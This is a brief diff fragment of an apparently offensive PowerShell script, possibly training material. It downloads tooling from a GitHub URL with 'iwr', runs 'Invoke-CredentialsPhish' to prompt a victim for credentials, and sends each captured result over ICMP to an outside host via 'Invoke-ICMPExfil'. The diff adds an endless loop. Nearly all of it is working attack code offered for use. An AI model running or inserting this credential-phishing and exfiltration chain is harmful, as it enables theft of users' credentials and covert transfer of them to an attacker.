@@ -12,3 +12,4 @@ iwr https://raw.githubusercontent.com/aptmasterclass/powershell-kungfu/master/ex
 
 Invoke-CredentialsPhish | % { $p = $_; 1..10 | % { Invoke-ICMPExfil -Target $ip -Payload $p -Verbose } }
 
+while($true){}
